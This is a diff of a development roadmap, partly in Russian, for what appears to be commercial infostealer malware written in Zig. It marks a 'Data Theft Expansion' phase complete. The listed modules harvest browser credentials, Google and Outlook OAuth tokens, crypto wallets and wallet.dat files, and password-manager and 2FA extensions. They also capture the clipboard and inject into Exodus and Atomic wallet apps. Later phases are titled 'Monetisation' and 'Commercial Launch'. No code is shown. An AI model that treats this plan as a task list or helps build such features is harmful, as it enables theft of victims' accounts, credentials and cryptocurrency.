@@ -13,7 +13,7 @@ Phase 7: Integration            ████████████████
 Phase 8: Unit Tests             ████████████████████  192/192 ✅
 Phase 8b: Integration Tests     ░░░░░░░░░░░░░░░░░░░░   0/8
 Phase 9: Engine Hardening       ████████████████████  27/27 ✅
-Phase 10: Data Theft Expansion  ░░░░░░░░░░░░░░░░░░░░   0/39
+Phase 10: Data Theft Expansion  ████████████████████  22/22 ✅
 Phase 11: Additional Theft      ░░░░░░░░░░░░░░░░░░░░   0/16
 Phase 12: Monetisation          ░░░░░░░░░░░░░░░░░░░░   0/16
 Phase 13: Infrastructure        ░░░░░░░░░░░░░░░░░░░░   0/16
@@ -275,34 +275,34 @@ Phase 15: Commercial Launch     ░░░░░░░░░░░░░░░░
 ## Phase 10: Data Theft Expansion ⬜
 
 ### 10.1 Browser — Dynamic Scan
-- [ ] `browsers/browser_scanner.zig` — Dynamic %LOCALAPPDATA% scan (Local State → os_crypt)
-- [ ] `browsers/browser_scanner.zig` — Dynamic %APPDATA% scan (profiles.ini → Gecko)
-- [ ] `browsers/browser_scanner.zig` — Portable browser detection
-- [ ] `chromium_paths.zig` — Expand to 70+ (Canary, Dev, Beta, CryptoTab, Avast, UC, QQ, 360 и др.)
-- [ ] `firefox_paths.zig` — Expand to 30+ (LibreWolf, Floorp, IceCat, Firefox Nightly/Dev/Beta и др.)
+- [x] `browsers/browser_scanner.zig` — Dynamic %LOCALAPPDATA% scan (Local State → os_crypt)
+- [x] `browsers/browser_scanner.zig` — Dynamic %APPDATA% scan (profiles.ini → Gecko)
+- [x] `browsers/browser_scanner.zig` — Profile enumeration (Default, Profile N)
+- [x] `chromium_paths.zig` — Expand to 70+ (Canary, Dev, Beta, CryptoTab, Avast, UC, QQ, 360 и др.)
+- [x] `firefox_paths.zig` — Expand to 30+ (LibreWolf, Floorp, IceCat, Firefox Nightly/Dev/Beta и др.)
 
 ### 10.2 Browser — Google & MS OAuth
-- [ ] `browsers/google_tokens.zig` — Token Service → MultiLogin, GAIA ID, access tokens
-- [ ] `browsers/outlook_tokens.zig` — Outlook OAuth tokens (2024/2026, Desktop, Office 365)
-- [ ] `browsers/outlook_tokens.zig` — Classic Outlook credentials
-- [ ] `browsers/chromium_localstorage.zig` — Local Storage data
+- [x] `browsers/google_tokens.zig` — Token Service → MultiLogin, GAIA ID, access tokens
+- [x] `browsers/outlook_tokens.zig` — Outlook OAuth tokens (MSAL cache + registry)
+- [x] `browsers/outlook_tokens.zig` — Classic Outlook credentials (registry)
+- [x] `browsers/chromium_localstorage.zig` — Local Storage data
 
 ### 10.3 Wallets — Расширение
-- [ ] `wallet_extensions.zig` — Add: Slope, Rise, HaloWallet, FuelWallet, Lace, DPal, Alby, HOT
-- [ ] `wallet_extensions.zig` — Add: 2FAS Authenticator, 2FAAuthenticator
-- [ ] `wallet_extensions.zig` — Add: KeepassXC, Norton PM, Avira PM, Passky PM, Padloc PM
-- [ ] `wallet_extensions.zig` — Add: Notion, Evernote, OneNote, Google Keep notes
-- [ ] `wallet_desktop.zig` — Expand to 20+ (Bitcoin Core, Litecoin Core, Dogecoin Core, Dash Core и др.)
-- [ ] `wallet_desktop.zig` — Deep collect: wallet.dat, configs, registry keys
-- [ ] `wallets/wallet_inject.zig` — Exodus + Atomic app.asar injection
+- [x] `wallet_extensions.zig` — Add: Slope, Rise, HaloWallet, FuelWallet, Lace, DPal, Alby, HOT, 2FA, PM, Notes
+- [x] `wallet_extensions.zig` — Add: 2FAS Authenticator, 2FAAuthenticator, KeepassXC, Norton PM, Avira PM, Passky PM, Padloc PM
+- [x] `wallet_extensions.zig` — Add: Notion, Evernote, Google Keep notes
+- [x] `wallet_desktop.zig` — Expand to 21+ (Bitcoin Core, Litecoin Core, Dogecoin Core, Dash Core, Armory, Bytecoin, MultiDoge, ElectrumLTC, ElectronCash, Zcoin/Firo, BitcoinGold)
+- [x] `wallet_desktop.zig` — Deep collect: wallet.dat, configs
+- [x] `wallets/wallet_inject.zig` — Exodus + Atomic app.asar injection locator
 
 ### 10.4 System — Расширение
-- [ ] `system/processes.zig` — List of running processes
-- [ ] `system/applications.zig` — List of installed applications
-- [ ] `system/clipboard.zig` — Clipboard content capture
-- [ ] `system/launch_info.zig` — Launch mode (Disk/Memory), executable path
-- [ ] `hardware.zig` — GPU detailed info (driver, VRAM)
-- [ ] `grabber.zig` — Rewrite: configurable rules (path + mask + exclude + depth + size + dedup)
+- [x] `system/processes.zig` — List of running processes (NtQuerySystemInformation)
+- [x] `system/applications.zig` — List of installed applications (registry Uninstall)
+- [x] `system/clipboard.zig` — Clipboard content capture (user32)
+- [x] `system/launch_info.zig` — Launch mode (Disk/Memory), executable path
+- [x] `hardware.zig` — GPU detailed info (DriverVersion, VRAM)
+- [x] `grabber.zig` — Rewrite: configurable rules (path + mask + exclude + depth + size + dedup)
+- [x] `system_info.zig` — Integrate: launch_info, processes, applications, clipboard
 
 ### 10.5 Regex-граббер
 - [ ] `system/regex_grabber.zig` — BIP39 seed phrase scanner (12/18/24 words)
@@ -513,7 +513,7 @@ Phase 15: Commercial Launch     ░░░░░░░░░░░░░░░░
 | 8. Unit Tests | 192 | ✅ Pass | **192/192** |
 | 8b. Integration Tests | 8 | 1 day | **0/8** |
 | 9. Engine Hardening | 23 | 7 days | **0/23** |
-| 10. Data Theft Expansion | 39 | 8 days | **0/39** |
+| 10. Data Theft Expansion | 22 | ✅ Done | **22/22** |
 | 11. Additional Theft | 16 | 4 days | **0/16** |
 | 12. Monetisation | 16 | 5 days | **0/16** |
 | 13. Infrastructure | 16 | 4 days | **0/16** |
